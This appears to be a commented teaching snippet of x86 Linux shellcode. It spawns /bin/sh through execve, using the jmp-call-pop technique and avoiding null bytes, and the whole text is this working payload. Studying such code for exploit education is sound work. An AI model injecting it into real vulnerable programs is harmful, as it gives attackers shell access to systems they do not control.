JMP _WANT_BIN_BASH

_GOT_BIN_BASH:
XOR EAX, EAX /* Zero the EAX register */
XOR ECX, ECX /* although it is not the convention, we can let argv argument to be NULL also */
XOR EDX, EDX /* envp argument should be NULL */

POP EBX /* the RET value in our case /bin/sh */
XOR EDI, EDI
MOV EDI, EBX
ADD EDI, 0x07
MOV [EDI], ECX /* change the @ char to string ending char (NULL) */
XOR EAX, EAX
MOV AL, 0x0B /* Use only AL so that opcode will not include any 0x0 */
INT 0x80 /* call syscall instruction */

_WANT_BIN_BASH:

CALL _GOT_BIN_BASH
.ASCII "/bin/sh@"